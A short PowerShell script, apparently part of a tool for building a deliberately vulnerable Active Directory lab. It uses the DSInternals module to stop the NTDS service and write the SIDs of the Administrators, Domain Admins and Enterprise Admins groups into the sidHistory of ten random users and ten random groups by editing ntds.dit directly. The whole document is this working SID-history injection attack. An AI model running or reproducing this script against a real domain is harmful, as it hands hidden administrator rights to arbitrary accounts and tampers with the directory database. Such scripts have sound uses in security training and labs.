#if the dsinternals module exists perform some sidhistory attacks
#Install-Module DSInternals -Force
if (Get-Module -ListAvailable -Name dsinternals) {

    $users=(get-aduser -filter *)| get-random -count 10
    $groups=(get-adgroup -filter *)| get-random -count 10
    $administrators = get-adgroup administrators
    $domadmins = get-adgroup 'domain admins'
    $entadmins = get-adgroup 'enterprise admins'
    stop-service ntds -force
    $users|%{
        $rando = 1..3|get-random
        if ($rando -eq 1){
            Add-ADDBSidHistory -samaccountname $_.samaccountname -sidhistory $administrators.sid -DBPath c:\windows\ntds\ntds.dit
        }elseif($rando -eq 2){
                Add-ADDBSidHistory -samaccountname $_.samaccountname -sidhistory $domadmins.sid -DBPath c:\windows\ntds\ntds.dit
            
        }else{
            Add-ADDBSidHistory -samaccountname $_.samaccountname -sidhistory $entadmins.sid -DBPath c:\windows\ntds\ntds.dit
        }
         
    }
    $groups|%{
        $rando = 1..3|get-random
        if ($rando -eq 1){
            Add-ADDBSidHistory -samaccountname $_.samaccountname -sidhistory $administrators.sid -DBPath c:\windows\ntds\ntds.dit
        }elseif($rando -eq 2){
                Add-ADDBSidHistory -samaccountname $_.samaccountname -sidhistory $domadmins.sid -DBPath c:\windows\ntds\ntds.dit
            
        }else{
            Add-ADDBSidHistory -samaccountname $_.samaccountname -sidhistory $entadmins.sid -DBPath c:\windows\ntds\ntds.dit
        }
         
    }
    start-service ntds
}